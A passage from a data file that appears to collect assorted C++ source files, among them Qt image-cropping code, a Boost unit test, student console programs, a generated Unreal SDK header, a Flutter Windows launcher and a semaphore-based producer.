image.convertToFormat(QImage::Format_ARGB32);//\u907f\u514d\u900f\u660e\u5ea6\u95ee\u9898\r\n    path = \"saved_background_image.png\";\r\n    image.save(path, \"PNG\");//\u4fdd\u5b58\u4e3aPNG\u683c\u5f0f\r\n    setBackground(path);\r\n}\r\n\r\n\r\nvoid CutAvator::paintEvent(QPaintEvent *event)//\u521d\u59cb\u5316\u6574\u4e2a\u7a97\u53e3\u80cc\u666f\r\n{\r\n    QPainter painter(this);\r\n    painter.setRenderHint(QPainter::Antialiasing);//\u53cd\u952f\u9f7f\r\n    QPixmap pixmap(\":/pictures/094 Cloudy Apple - trans.png\");\r\n    painter.drawPixmap(0, 0, width(), height(), pixmap);\r\n    QIcon icon(\":/pictures/suliao.png\");\r\n    setWindowIcon(icon);\r\n}\r\n\r\n\r\nvoid CutAvator::setBackground(QString avapath)//\u8bbe\u7f6e\u5934\u50cf\r\n{\r\n    QPixmap originalPixMap(avapath);\r\n    QSize targetSize(277, 300);//\u5b50\u7a97\u53e3\u5927\u5c0f\r\n    QSize maxSize(277, 277);//\u6700\u5927\u56fe\u7247\u5c3a\u5bf8\r\n    QPixmap scaledPixMap = originalPixMap.scaled(maxSize, Qt::KeepAspectRatio, Qt::SmoothTransformation);\r\n    QPixmap resultPixMap(targetSize);\r\n    QPainter painter(&resultPixMap);\r\n    painter.setRenderHint(QPainter::Antialiasing);//\u53cd\u952f\u9f7f\r\n    painter.fillRect(resultPixMap.rect(), QColor(255, 255, 255, 255));//\u80cc\u666f\u4e3a\u767d\u8272\r\n    //\u8ba1\u7b97\u5c45\u4e2d\u7ed8\u5236\u4f4d\u7f6e\r\n    int x = (targetSize.width() - scaledPixMap.width()) / 2;\r\n    int y = (targetSize.height() - scaledPixMap.height()) / 2 + 11.5;\r\n    painter.drawPixmap(x, y, scaledPixMap);\r\n    //\u8ba1\u7b97 labelRect \u7684\u4f4d\u7f6e\r\n    if (flag > 0) {\r\n        delete labelRect;\r\n        labelRect = nullptr;\r\n        flag--;\r\n    }\r\n    CutAvator::labelRect = new QRect(ui->lab_cut->geometry());\r\n    flag++;\r\n    //\u8ba1\u7b97\u5168\u5c40\u4f4d\u7f6e\r\n    QPoint globalPos = ui->lab_cut->mapToGlobal(QPoint(0, 0)) + QPoint(0, 23);\r\n    labelRect->moveTopLeft(globalPos);\r\n    //\u4fdd\u5b58 labelRect \u533a\u57df\u7684\u80cc\u666f\r\n    QPixmap backgroundPixmap(resultPixMap.copy(*labelRect));\r\n    //\u7ed8\u5236\u534a\u900f\u660e\u5c42\r\n    painter.fillRect(resultPixMap.rect(), QColor(0, 0, 0, 128));\r\n    //\u5728\u77e9\u5f62\u533a\u57df\u5185\u6062\u590d\u80cc\u666f\r\n    painter.drawPixmap(labelRect->topLeft(), backgroundPixmap);\r\n    //\u7ed8\u5236 labelRect \u8fb9\u6846\r\n    painter.setPen(QColor(0, 0, 0));//\u9ed1\u8272\u8fb9\u6846\r\n    painter.drawRect(*labelRect);\r\n    //\u8bbe\u7f6e\u8c03\u8272\u677f\u5e94\u7528\u80cc\u666f\u56fe\r\n    QPalette palette;\r\n    palette.setBrush(QPalette::Window, resultPixMap);\r\n    ui->dock_avator->setAutoFillBackground(true);\r\n    ui->dock_avator->setPalette(palette);\r\n    ui->dock_avator->setFeatures(QDockWidget::NoDockWidgetFeatures);\r\n}\r\n\r\n\r\nvoid CutAvator::moveRect(const QPoint &newPosition)//\u79fb\u52a8\u660e\u4eae\u77e9\u5f62\u66f4\u65b0\u5934\u50cf\r\n{\r\n    QSize targetSize(277, 300);//\u5b50\u7a97\u53e3\u5927\u5c0f\r\n    QSize maxSize(277, 277);//\u6700\u5927\u56fe\u7247\u5c3a\u5bf8\r\n    QPixmap originalPixMap(path);\r\n    QPixmap scaledPixMap = originalPixMap.scaled(maxSize, Qt::KeepAspectRatio, Qt::SmoothTransformation);\r\n    QPixmap resultPixMap(targetSize);\r\n    QPainter painter(&resultPixMap);\r\n    painter.setRenderHint(QPainter::Antialiasing);//\u53cd\u952f\u9f7f\r\n    painter.fillRect(resultPixMap.rect(), QColor(255, 255, 255, 255));//\u80cc\u666f\u4e3a\u767d\u8272\r\n    //\u66f4\u65b0 labelRect \u7684\u5927\u5c0f\u4ee5\u5339\u914d ui->lab_cut\r\n    QSize newSize = ui->lab_cut->size();\r\n    labelRect->setSize(newSize);\r\n    labelRect->moveTopLeft(newPosition + QPoint(0, 23));\r\n    //\u8ba1\u7b97\u5c45\u4e2d\u7ed8\u5236\u4f4d\u7f6e\r\n    int x = (targetSize.width() - scaledPixMap.width()) / 2;\r\n    int y = (targetSize.height() - scaledPixMap.height()) / 2 + 11.5;\r\n    painter.drawPixmap(x, y, scaledPixMap);\r\n    //\u4fdd\u5b58 labelRect \u533a\u57df\u7684\u80cc\u666f\r\n    QPixmap backgroundPixmap(resultPixMap.copy(*labelRect));\r\n    //\u7ed8\u5236\u534a\u900f\u660e\u5c42\r\n    painter.fillRect(resultPixMap.rect(), QColor(0, 0, 0, 128));\r\n    //\u5728\u77e9\u5f62\u533a\u57df\u5185\u6062\u590d\u80cc\u666f\r\n    painter.drawPixmap(labelRect->topLeft(), backgroundPixmap);\r\n    //\u7ed8\u5236 labelRect \u8fb9\u6846\r\n    painter.setPen(QColor(0, 0, 0, 0));//\u9ed1\u8272\u8fb9\u6846\r\n    painter.drawRect(*labelRect);\r\n    //\u66f4\u65b0\u8c03\u8272\u677f\u4ee5\u4f7f\u7528\u65b0\u7684\u80cc\u666f\u56fe\u50cf\r\n    QPalette palette;\r\n    palette.setBrush(QPalette::Window, resultPixMap);\r\n    ui->dock_avator->setPalette(palette);\r\n}\r\n\r\n\r\nvoid CutAvator::on_but_cut_clicked()//\u70b9\u51fb\u540e\u526a\u88c1\u5934\u50cf\r\n{\r\n    ui->lab_cut->setVisible(false);//\u9632\u6b62\u622a\u5230\u8fb9\u6846\u9ed1",
    "//  Unit test for boost::lexical_cast.\n//\n//  See http://www.boost.org for most recent version, including documentation.\n//\n//  Copyright Antony Polukhin, 2012-2014.\n//\n//  Distributed under the Boost\n//  Software License, Version 1.0. (See accompanying file\n//  LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt).\n\n#include <boost/config.hpp>\n\n#include <boost/lexical_cast/detail/converter_lexical.hpp>\n\n#include <boost/test/unit_test.hpp>\n\ntemplate <class T>\nstatic void test_optimized_types_to_string_const()\n{\n    namespace de = boost::detail;\n    typedef de::lexical_cast_stream_traits<T, std::string> trait_1;\n    BOOST_CHECK(!trait_1::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_1::src_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_1::target_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_1::char_type, char>::value));\n    BOOST_CHECK(!trait_1::is_string_widening_required_t::value);\n    BOOST_CHECK(!trait_1::is_source_input_not_optimized_t::value);\n        \n    typedef de::lexical_cast_stream_traits<const T, std::string> trait_2;\n    BOOST_CHECK(!trait_2::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_2::src_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_2::target_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_2::char_type, char>::value));\n    BOOST_CHECK(!trait_2::is_string_widening_required_t::value);\n    BOOST_CHECK(!trait_2::is_source_input_not_optimized_t::value);\n\n    typedef de::lexical_cast_stream_traits<T, std::wstring> trait_3;\n    BOOST_CHECK(!trait_3::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_3::src_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_3::target_char_t, wchar_t>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_3::char_type, wchar_t>::value));\n\n    BOOST_CHECK((boost::detail::is_character<BOOST_DEDUCED_TYPENAME trait_3::no_cv_src>::value != trait_3::is_string_widening_required_t::value));\n\n    BOOST_CHECK(!trait_3::is_source_input_not_optimized_t::value);\n}    \n\n\ntemplate <class T>\nstatic void test_optimized_types_to_string()\n{\n    test_optimized_types_to_string_const<T>();\n\n    namespace de = boost::detail;\n    typedef de::lexical_cast_stream_traits<std::string, T> trait_4;\n    BOOST_CHECK(!trait_4::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_4::src_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_4::target_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_4::char_type, char>::value));\n    BOOST_CHECK(!trait_4::is_string_widening_required_t::value);\n    BOOST_CHECK(!trait_4::is_source_input_not_optimized_t::value);\n        \n    typedef de::lexical_cast_stream_traits<const std::string, T> trait_5;\n    BOOST_CHECK(!trait_5::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_5::src_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_5::target_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_5::char_type, char>::value));\n    BOOST_CHECK(!trait_5::is_string_widening_required_t::value);\n    BOOST_CHECK(!trait_5::is_source_input_not_optimized_t::value);\n\n    typedef de::lexical_cast_stream_traits<const std::wstring, T> trait_6;\n    BOOST_CHECK(!trait_6::is_source_input_not_optimized_t::value);\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_6::src_char_t, wchar_t>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_6::target_char_t, char>::value));\n    BOOST_CHECK((boost::is_same<BOOST_DEDUCED_TYPENAME trait_6::char_type, wchar_t>::value));\n    BOOST_CHECK(!trait_6::is_string_widening_required_t::value);\n}\n\nvoid test_metafunctions()\n{\n    test_optimized_types_to_string<bool>();\n    test_optimized_types_to_string<char>();\n    test_optimized_types_to_string<unsigned char>();\n    test_optimized_types_to_string<signed char>();\n    test_optimized_types_to_string<short>();\n    test_optimized_types_to_string<unsigned short>();\n    test_optimized_types_to_string<int>();\n    test_optimized_types_to_string<unsigned int>();\n    test_optimized_types_to_string<long>();\n    test_optimized_types_to_string<unsigned long>();\n\n#if defined(BOOST_HAS_LONG_LONG)\n    test_optimized_types_to_string<boost::ulong_long_type>();\n    test_optimized_types_to_string<boost::long_long_type>();\n#elif defined(BOOST_HAS_MS_INT64)\n    test_optimized_types_to_string<unsigned __int64>();\n    test_optimized_types_to_string<__int64>();\n#endif\n    \n    test_optimized_types_to_string<std::string>();\n    test_optimized_types_to_string<char*>();\n    //test_optimized_types_",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main() {\r\ndouble MEDIDA,CANTIDAD,CONVERSION;\r\ndouble RESPUESTA;\r\nchar MENSAJE;\r\ncout << \"SELECCIONE LA UNIDAD A CONVERTIR\" << endl<<\"1. AMPERAJE(A) \" << endl<<\"2. VOLTAJE(V)\"<<endl<<\"3.  RESISTENCIA(O)\"<<endl;\r\ncin >> MEDIDA;\r\nwhile((MEDIDA<=0)||(MEDIDA>3))\r\n{\r\ncout << \"INGRESE UNA OPCION VALIDA\" << endl;\r\ncin >> MEDIDA;\r\n}\r\ncout << \"SELECCIONE LA CONVERSION\" << endl<<\"1. MILI A BASE \" << endl<<\"2. MICRO A BASE\"<<endl<<\"3. BASE A MILI\"<<endl<<\"4. BASE A MICRO\"<<endl<<\"5. BASE A KILO\"<<endl<<\"6. KILO A BASE\"<<endl;\r\ncin >> CONVERSION;\r\nwhile((CONVERSION<=0)||(CONVERSION>6))\r\n{\r\ncout << \"INGRESE UNA OPCION VALIDA\" << endl;\r\ncin >> CONVERSION;\r\n}\r\ncout << \"INGRESE LA CANTIDAD A CONVERTIR\" << endl;\r\ncin >> CANTIDAD;\r\nwhile((CANTIDAD<=0))\r\n{\r\ncout << \"INGRESE NUMERO POSITIVO\" << endl;\r\ncin >> CANTIDAD;\r\n}\r\nif(MEDIDA==1){\r\nMENSAJE='A';\r\n}\r\nif(MEDIDA==2){\r\nMENSAJE='V';\r\n}\r\nif(MEDIDA==3){\r\nMENSAJE='O';\r\n}\r\nif(CONVERSION==1){\r\nRESPUESTA=CANTIDAD/1000;\r\ncout << CANTIDAD <<\" mili \"<<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" \"<<MENSAJE<<endl;\r\n}\r\nif(CONVERSION==2){\r\nRESPUESTA=CANTIDAD/1000000;\r\ncout << CANTIDAD <<\" micro \"<<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" \"<<MENSAJE<<endl;\r\n}\r\nif(CONVERSION==3){\r\nRESPUESTA=CANTIDAD*1000;\r\ncout << CANTIDAD <<\" \"<<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" mili \"<<MENSAJE<<endl;\r\n}\r\nif(CONVERSION==4){\r\nRESPUESTA=CANTIDAD*1000000;\r\ncout << CANTIDAD <<\" \"<<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" micro \"<<MENSAJE<<endl;\r\n}\r\nif(CONVERSION==5){\r\nRESPUESTA=CANTIDAD/1000;\r\ncout << CANTIDAD <<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" kilo \"<<MENSAJE<<endl;\r\n}\r\nif(CONVERSION==6){\r\nRESPUESTA=CANTIDAD*1000;\r\ncout << CANTIDAD <<\" kilo \"<<MENSAJE<<\" es igual a \"<<RESPUESTA<<\" \"<<MENSAJE<<endl;\r\n}\r\n    return 0;}\r\n",
    "#include <iostream>\n#include\"Venta.h\"\n#include\"Cliente.h\"\n#include\"Producto.h\"\n#include\"STL.h\"\n\nusing namespace std;\n\nint main() {\n    List<Cliente*> listaClientes; // Usamos List para clientes con punteros\n    List<Producto*> listaProductos; // Usamos List para productos con punteros\n    List<Venta*> listaVentas; // Usamos List para ventas con punteros\n\n    int opcion = 0;\n    while (opcion != 8) {\n\n        // Men\u00fa de opciones\n        cout << \"\\nMENU DE OPCIONES\" << endl;\n        cout << \"1. Agregar Clientes\" << endl;\n        cout << \"2. Agregar Productos\" << endl;\n        cout << \"3. Hacer Ventas\" << endl;\n        cout << \"4. Ver lista de clientes\" << endl;\n        cout << \"5. Ver lista de productos\" << endl;\n        cout << \"6. Ver lista de ventas\" << endl;\n        cout << \"7. Ver detalles de la venta\" << endl;\n        cout << \"8. Salir\" << endl;\n        cout << \"Seleccione una opcion: \";\n        cin >> opcion;\n\n        switch (opcion) {\n            case 1: {\n                system(\"cls\");\n                // Agregar cliente\n                int id;\n                string nombre, apellido;\n                cout << \"\\nIngrese ID del cliente: \";\n                cin >> id;\n                cout << \"Ingrese nombre del cliente: \";\n                cin >> nombre;\n                cout << \"Ingrese apellido del cliente: \";\n                cin >> apellido;\n                listaClientes.push_back(new Cliente(id, nombre, apellido)); // Crear cliente din\u00e1micamente\n                cout << \"Cliente agregado exitosamente.\\n\";\n                break;\n            }\n            case 2: {\n                system(\"cls\");\n                // Agregar producto\n                int id;\n                string descripcion;\n                float precio;\n                int existencias;\n                cout << \"\\nIngrese ID del producto: \";\n                cin >> id;\n                cout << \"Ingrese descripcion del producto: \";\n                cin >> descripcion;\n                cout << \"Ingrese precio unitario del producto: \";\n                cin >> precio;\n                cout << \"Ingrese existencias del producto: \";\n                cin >> existencias;\n                listaProductos.push_back(new Producto(id, descripcion, precio, existencias)); // Crear producto din\u00e1micamente\n                cout << \"Producto agregado exitosamente.\\n\";\n                break;\n            }\n            case 3: {\n                system(\"cls\");\n                // Hacer una venta\n                int idVenta, idCliente;\n                cout << \"\\nIngrese el numero de factura: \";\n                cin >> idVenta;\n                cout << \"Ingrese el ID del cliente que realiza la compra: \";\n                cin >> idCliente;\n\n                Cliente* cliente = nullptr;\n                for (List<Cliente*>::Iterator it = listaClientes.begin(); it != listaClientes.end(); ++it) {\n                    if ((*it)->getIdCliente() == idCliente) {\n                        cliente = *it; // Cliente encontrado, tomar el puntero\n                        break;\n                    }\n                }\n\n                if (cliente == nullptr) {\n                    cout << \"Cliente no encontrado.\\n\";\n                } else {\n                    Venta* nuevaVenta = new Venta(idVenta, \"2023-09-01\", cliente); // Crear venta din\u00e1micamente\n                    int idProducto, cantidad;\n                    char agregarOtroProducto;\n\n                    do {\n                        cout << \"Ingrese el ID del producto a vender: \";\n                        cin >> idProducto;\n\n                        Producto* producto = nullptr;\n                        for (List<Producto*>::Iterator it = listaProductos.begin(); it != listaProductos.end(); ++it) {\n                            if ((*it)->getIdProducto() == idProducto) {\n                                producto = *it; // Producto encontrado, tomar el puntero\n                                break;\n                            }\n                        }\n\n                        if (producto == nullptr) {\n                            cout << \"Producto no encontrado.\\n\";\n                        } else {\n                            cout << \"Ingrese la cantidad a vender: \";\n                            cin >> cantidad;\n\n                            if (producto->getExistencia() >= cantidad) {\n                                producto->setExistencia(producto->getExistencia() - cantidad);  // Actualizar existencias\n                                nuevaVenta->agregarProducto(producto);  // Agregar producto a la venta\n                                cout << \"Producto agregado a la venta.\\n\";\n                            } else {\n                                cout << \"No hay suficientes existencias para este producto.\\n\";\n                            }\n                        }\n\n                        cout << \"\u00bfDesea agregar otro producto? (s/n): \";\n                        cin >> agregarOtroProducto;\n\n                    } while (agregarOtroProducto == 's' || agrega",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: TooltipMinusBasicMinusS\n\n#include \"Basic.hpp\"\n\n#include \"TooltipMinusBasicMinusS_classes.hpp\"\n#include \"TooltipMinusBasicMinusS_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function Tooltip-Basic-S.Tooltip-Basic-S_C.ExecuteUbergraph_Tooltip-Basic-S\n// (Final, UbergraphFunction)\n// Parameters:\n// int32                                   EntryPoint                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UTooltipMinusBasicMinusS_C::ExecuteUbergraph_TooltipMinusBasicMinusS(int32 EntryPoint)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"Tooltip-Basic-S_C\", \"ExecuteUbergraph_Tooltip-Basic-S\");\n\n\tParams::TooltipMinusBasicMinusS_C_ExecuteUbergraph_TooltipMinusBasicMinusS Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function Tooltip-Basic-S.Tooltip-Basic-S_C.Construct\n// (BlueprintCosmetic, Event, Public, BlueprintEvent)\n\nvoid UTooltipMinusBasicMinusS_C::Construct()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"Tooltip-Basic-S_C\", \"Construct\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function Tooltip-Basic-S.Tooltip-Basic-S_C.Get Body Text\n// (Public, HasOutParams, BlueprintCallable, BlueprintEvent, BlueprintPure)\n// Parameters:\n// class FText                             ReturnValue                                            (Parm, OutParm, ReturnParm)\n\nclass FText UTooltipMinusBasicMinusS_C::Get_Body_Text()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"Tooltip-Basic-S_C\", \"Get Body Text\");\n\n\tParams::TooltipMinusBasicMinusS_C_Get_Body_Text Parms{};\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\treturn Parms.ReturnValue;\n}\n\n\n// Function Tooltip-Basic-S.Tooltip-Basic-S_C.Get Header Text\n// (Public, HasOutParams, BlueprintCallable, BlueprintEvent, BlueprintPure)\n// Parameters:\n// class FText                             ReturnValue                                            (Parm, OutParm, ReturnParm)\n\nclass FText UTooltipMinusBasicMinusS_C::Get_Header_Text()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"Tooltip-Basic-S_C\", \"Get Header Text\");\n\n\tParams::TooltipMinusBasicMinusS_C_Get_Header_Text Parms{};\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\treturn Parms.ReturnValue;\n}\n\n\n// Function Tooltip-Basic-S.Tooltip-Basic-S_C.Get Icon Brush\n// (Public, HasOutParams, HasDefaults, BlueprintCallable, BlueprintEvent, BlueprintPure)\n// Parameters:\n// struct FSlateBrush                      ReturnValue                                            (Parm, OutParm, ReturnParm)\n\nstruct FSlateBrush UTooltipMinusBasicMinusS_C::Get_Icon_Brush()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"Tooltip-Basic-S_C\", \"Get Icon Brush\");\n\n\tParams::TooltipMinusBasicMinusS_C_Get_Icon_Brush Parms{};\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\treturn Parms.ReturnValue;\n}\n\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"card_matching_game\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <_stdio.h>\n#include <array>\n#include <cctype>\n#include <fstream>\n#include <string>\n#include <iostream>\n#include <vector>\n\n#include \"Galaxy.h\"\n\nusing namespace std;\n\nint main(){\n    // Open the user credentials file\n    ifstream InputFile(\"users.txt\");\n    if (!InputFile) {\n        cerr << \"Unable to open file example.txt\" << endl; // Error handling\n        return 1;\n    }\n    // Open the Probes input file\n    ifstream ProbesInput(\"Probes.txt\");\n    if (!ProbesInput) {\n        cerr << \"Unable to open file example.txt\" << endl; // Error handling\n        return 1;\n    }\n    string user, password, input_user, input_password; // Variables for storing user credentials\n    bool credential = false; // Flag for tracking successful login\n    int id; // Variable to store Probe ID\n    array<int, 2> dim, pos; // Arrays to store dimensions and positions of Probes\n    Galaxy galaxy; // Create a Galaxy object\n\n    // Read user credentials from the file\n    InputFile >> user >> password;\n    // cout << user << password << endl;\n    \n    // user login\n    cout << \"Login with credential\" << endl;\n    while (!credential) {\n        \n        cout << \"User name: \";\n        cin >> input_user; // Get username from user\n        cout << \"Password: \";\n        cin >> input_password; // Get password from user\n        // Check if input credentials match stored credentials\n        if((input_user != user) || (input_password != password)){\n            cout << \"User name or password does not match, input again\" << endl;\n        }\n        else{\n            credential = true;\n        }\n    }\n\n    string Probe_name; // Variable to store Probe names\n\n    // read from Probes.txt\n    while(!ProbesInput.eof()){\n        \n        getline(ProbesInput, Probe_name); // Read the Probe name\n        // Check if the Probe name is valid\n        if(isalpha(Probe_name[0]) && !Probe_name.empty()){\n            ProbesInput >> id >> dim[0] >> dim[1] >> pos[0] >> pos[1];\n            Probe p; // Create a new Probe object\n            p.setName(Probe_name); // Set the Probe name\n            p.setID(id); // Set the Probe ID\n            p.setDimension(0, dim[0]); // Set dimensions\n            p.setDimension(1, dim[1]);\n            p.setPosition(0, pos[0]); // Set positions\n            p.setPosition(1, pos[1]);\n            p.calculateArea(); // Calculate the area of the Probe\n            galaxy.add_Probe(p); // Add the Probe to the Galaxy\n        }\n    }\n\n\n    \n\n    bool contin = true; // Flag to control the main menu loop\n    int choice, index, source, destin, n, nn; // Variables for user choices and indices\n    string temp_word; // Temporary variable for input\n    double new_value; // Variable to hold new dimension/position values\n    Probe result; // Variable to store search results\n\n    // main menu\n    while (contin) {\n        // Display menu options to the user\n        cout << endl << \"1. Sort Probes by Name\" << endl;\n        cout << \"2. Sort Probes by ID\" << endl;\n        cout << \"3. Sort Probes by Area\" << endl;\n        cout << \"4. Randomize Probe Order\" << endl;\n        cout << \"5. Print All Probe Names\" << endl;\n        cout << \"6. Search Probe by Name\" << endl;\n        cout << \"7. Search Probe by ID\" << endl;\n        cout << \"8. Write Galaxy to File\" << endl;\n        cout << \"9. Swap Probe Data\" << endl;\n        cout << \"10. Insert Probe Data\" << endl;\n        cout << \"11. Copy Probe\" << endl;\n        cout << \"12. Display Probe\" << endl;\n        cout << \"13. Quit\" << endl;\n        cout << \"14. Return a list of name for each Probe that would collide\" << endl;\n\n        cout << \"Enter your choice (1-13): \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: // Sort Probes by name\n                cout << \"Probes sorted by name.\" << endl << endl;\n                galaxy.sortByName();\n                cout << \"Current order of probes: \" << endl;\n                galaxy.printAllNames();\n                \n                break;\n            case 2: // Sort Probes by ID\n                cout << \"Probes sorted by ID.\" << endl << endl;\n                galaxy.sortByID();\n                cout << \"Current order of probes: \" << endl;\n                for (int i = 0; i < 10; i++ ) {\n                    cout << i + 1 << \". \" << galaxy.retrieve(i).getName() << \"(ID: \" << galaxy.retrieve(i).getID() << \")\" << endl;\n                }\n                break;\n            case 3: // Sort Probes by area\n                cout << \"Probes sorted by area.\" << endl << endl;\n                galaxy.sortByarea();\n                cout << \"Current order of probes: \" << endl;\n                for (int i = 0; i < 10; ++i ) {\n                    cout << i + 1 << \". \" << galaxy.retrieve(i).getName() << \"(Area: \" << galaxy.retrieve(i).getArea() << \")\" << endl;\n                }\n                break;\n            case 4: // Randomize the order of Probes\n                cout << \"Probe order randomized.\" << endl << endl;\n                galaxy.randomizeOrder();\n\n                cout <",
    "// Alicia Brown\n// Assignment 1: Producer File\n// Dr. Qiang Guan\n// 11/1/24\n\n#include <iostream>\n#include <pthread.h>\n#include <semaphore.h>\n#include <unistd.h>\n#include <cstdlib>\n#include <sys/mman.h>\n#include \"shared.hpp\"\n\nint main(int argc, char* argv[]){\n    \n    int shmShared = shm_open(shmPath, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);\n    if (shmShared == -1) {\n        std::cerr << \"Error creating shared memory: \" << strerror(errno) << std::endl;\n        return 1;\n    }\n\n    ftruncate(shmShared, sizeof(sharedData));\n\n    sharedData *producer = static_cast<sharedData*>(mmap(nullptr, sizeof(sharedData), PROT_READ | PROT_WRITE, MAP_SHARED, shmShared, 0));\n    if (producer == MAP_FAILED) {\n        std::cerr << \"Error mapping shared memory: \" << strerror(errno) << std::endl;\n        close(shmShared);\n        return 1;\n    }\n\n    // initalizing the semaphores, mutex, etc.\n    producer->in = 0;\n    producer->out = 0;\n\n    // unlink semaphores\n    sem_unlink(\"/empty_semaphore\");\n    sem_unlink(\"/full_semaphore\");\n    sem_unlink(\"/mutex_semaphore\");\n   \n\n    // making sure that the semaphores do not become deprecated when running the programs\n    producer->empty = sem_open(\"/empty_semaphore\", O_CREAT, 0666, maxItems);\n    producer->full = sem_open(\"/full_semaphore\", O_CREAT, 0666, 0);\n    producer->mutex = sem_open(\"/mutex_semaphore\", O_CREAT, 0666, 1);\n\n\n    if (producer->empty == SEM_FAILED || producer->full == SEM_FAILED) {\n        std::cerr << \"Error initializing semaphores: \" << strerror(errno) << std::endl;\n        munmap(producer, sizeof(sharedData));\n        close(shmShared);\n        return 1;\n    }\n\n    // how many items produced\n    for (int i = 0; i < 2; ++i) {\n        sleep(1);  // waiting to see if available to output\n        sem_wait(producer->empty);\n        sem_wait(producer->mutex); // locking the critical section\n    \n\n        producer->in = (producer->in + 1) % maxItems;  // reiterate until in ends\n        std::cout << \" \" << std::endl;\n        std::cout << \"Produced : \" << i << std::endl;\n\n\n        sem_post(producer->mutex); // unlocking the mutex\n        sem_post(producer->full);  // incrementing value\n\n    }\n\n    // cleanup\n    sem_unlink(\"/empty_semaphore\");\n    sem_unlink(\"/full_semaphore\");\n    sem_unlink(\"/mutex_semaphore\");\n    shm_unlink(shmPath);\n    sem_close(producer->empty);\n    sem_close(producer->full);\n    sem_close(producer->mutex);\n\n    munmap(producer, sizeof(sharedData));\n    close(shmShared);\n\n    return 0;\n}\n\n\n",
